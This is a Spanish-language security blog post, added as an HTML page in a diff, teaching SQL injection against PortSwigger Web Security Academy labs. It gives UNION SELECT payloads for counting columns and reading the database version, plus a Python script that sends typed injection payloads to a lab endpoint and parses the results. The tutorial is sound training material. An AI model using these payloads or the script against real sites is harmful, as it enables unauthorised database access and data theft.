@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        TheFirstAvenger
+    </title>
+    <meta name="description" content= Queremos seguir aprendiendo y compartir nuestra passion por la Ciberseguridad >
+    <meta name="keywords" content= windows, linux, CVE, vulnerabilidades, seguridad, ciberseguridad, hacking, pentest, pentesting, red team, hacking web, cheat sheet, OSCP, OSCE, pentesters >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            SQL injection - Parte 2
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1><a href="#sql-injection-parte-2" class="header-anchor">#</a><span id="sql-injection-parte-2">SQL Injection - Parte 2</span></h1><h2><a href="#resumen-del-post" class="header-anchor">#</a><span id="resumen-del-post">Resumen del post</span></h2><p>En esta segunda parte voy a explicar un poco mi metodología siguiendo los pasos que nos indican <a href="https://portswigger.net" target="_blank" rel="noopener">portswigger</a>. Como podemos identificar las columnas y extraer información de la base de datos.<br>Finalmente voy a compartir el script que he creado para ver como podríamos utilizar Python para automatizar la extracción de información.</p>
+<h2><a href="#identificar-el-numero-de-columnas" class="header-anchor">#</a><span id="identificar-el-numero-de-columnas">Identificar el numero de columnas</span></h2><p>Esto realmente es muy importante, ya que muchas veces hay algunas columnas invisibles que necesitamos conocer o simplemente ver el tipo de variable que se puede almacenar en cada parámetro que pasamos.</p>
+<p>Primero de todo podemos identificar donde hay la sentencia sql y donde se muestra esta información.<br>En este caso simplemente vemos que muestra 3 columnas y el parámetro se encuentra en la URL lo cual es una petición de tipo GET.</p>
+<p><img src="https://i.imgur.com/QHaClNu.png" alt="Portswigger1.png"></p>
+<p>Este reto simplemente consiste en identificar el número de columnas. Para ello podemos hacer un SELECT NULL,NULL … Tantas columnas pueda haber. Eso lo que hace es imprimir un espacio nulo e identificar el número exacto de columnas, ya que si no la página nos muestra un error. Para hacer esta sentencia necesitamos conocer como funciona UNION esto lo que hace es unir dos tablas en una.<br>Primero identificamos cuantas columnas hay:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac9f1f2d1e006eb580617223003300d1.web-security-academy.net&#x2F;filter?category&#x3D;Pets&#39; UNION SELECT NULL,NULL,NULL -- -</span><br></pre></td></tr></table></figure>
+
+<p>Una vez sabemos que hay 3 ya podemos empezar a extraer información identificando el tipo de variable que hay.<br>Ejemplo, vamos a mostrar información creada por nosotros.<br>Url :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac9f1f2d1e006eb580617223003300d1.web-security-academy.net&#x2F;filter?category&#x3D;Pets&#39; UNION SELECT 1,&#39;abc&#39;,3 -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgur.com/WOjdhR0.png" alt="SQLi, detect .png"></p>
+<p>Identificamos que el texto está en la segunda columna de nuestra petición y la 1.ª y la 3.ª son de tipo int, lo cual no podemos extraer mucha información. Para enumerar podemos utilizar un <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">cheat sheet muy bueno de portswigger</a> Que nos puede ayudar a ver la base de datos que estamos atacando.</p>
+<p>Para ver la versión utilizo esta sentencia:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ac9f1f2d1e006eb580617223003300d1.web-security-academy.net&#x2F;filter?category&#x3D;Pets&#39;UNION SELECT NULL,version(),NULL -- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgur.com/5IOEi0O.png" alt="VERSION .png"></p>
+<p>Ahora finalmente voy a compartir un pequeño script creado en Python para poder extraer esta información. Para poder explicar-lo me hubiese gustado crear un video a YouTube pero actualmente no cuento con micro y lo cual tengo que compartir estos tutoriales por escrito.<br>Esto me ha ayudado mucho y me ha servido de mucha ayuda para extraer informaciones de tablas y poder extraer información de una Blind SQLi. Que eso ya lo hablaremos en otra parte. Y también este script que comparto esta de forma muy basica, ya que animo a que puedas crear tu propio script y tenerlo como idea.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3 </span><br><span class="line"></span><br><span class="line">import requests </span><br><span class="line">import re </span><br><span class="line">import sys </span><br><span class="line">import signal </span><br><span class="line"></span><br><span class="line"># Global vars </span><br><span class="line">host &#x3D; &#39;ac201f2c1e53acaf801df8b6004400b5&#39;</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;&#123;0&#125;.web-security-academy.net&#x2F;filter&#39;.format(host)</span><br><span class="line"></span><br><span class="line">def signal_handler(sig, frame):</span><br><span class="line">    print(&#39;\n[Ctrl + c ] Saliendo ...&#39;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line">signal.signal(signal.SIGINT, signal_handler)</span><br><span class="line"></span><br><span class="line">def sqli_requests(sqli):</span><br><span class="line">    try: </span><br><span class="line">        header&#x3D; &#123;</span><br><span class="line">                    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0&#39;,</span><br><span class="line">                    &#39;Accept&#39; : &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&#39;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        payload &#x3D; &#123;&#39;category&#39;: sqli&#125;</span><br><span class="line"></span><br><span class="line">        r &#x3D; requests.get(url,params&#x3D;payload, headers&#x3D;header)</span><br><span class="line">        </span><br><span class="line">        # Logrado el laboratorio</span><br><span class="line">        if re.search(r&#39;&lt;p&gt;Solved&lt;&#x2F;p&gt;&#39;, r.text):</span><br><span class="line">            print(&#39;Congratulations, you solved the lab!&#39;)</span><br><span class="line">        </span><br><span class="line">        # Filtrar la info</span><br><span class="line">        data_filter &#x3D; re.findall(r&#39;(?:&lt;tbody&gt;)([\s\S]*)(?:&lt;&#x2F;tbody&gt;)&#39;, r.text)</span><br><span class="line">        data_filter &#x3D; re.findall(r&#39;(?&lt;&#x3D;&gt;)(.*?)(?&#x3D;&lt;\&#x2F;)&#39;,data_filter[0])</span><br><span class="line"></span><br><span class="line">        print(r,url)</span><br><span class="line">        return data_filter</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line">        print(r.url)</span><br><span class="line">        print(&quot;ERROR : &quot;, sys.exc_info()[0])</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    while True: </span><br><span class="line">        sqli&#x3D;input(&#39;SQLI: &#39;)</span><br><span class="line">    </span><br><span class="line">        data &#x3D; sqli_requests(sqli)</span><br><span class="line">        print(data)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>OUTPUT</p>
+<p><img src="../_resources/26a2648d1e724b8a918066e5f0cb1879.png" alt="OUTPUT1.png"></p>
+<p>Si quieres ver como progresa mi script lo tengo público en mi repositorio, <a href="https://github.com/Th3FirstAvenger/SQL-Injection" target="_blank" rel="noopener">Repositorio de GitHub</a>.</p>
+
+    </div>
+
+    
+</div>
+
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: J4ck21 | 主题 By <a class="theme-author" href="https://github.com/Xunzhuo/hexo-theme-coder" target="_blank" rel="noopener" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="NOsswOncKgc8HOxqo9oxIWlX-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="z1FihjWEbS8uIfUQdmCtK7zz">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
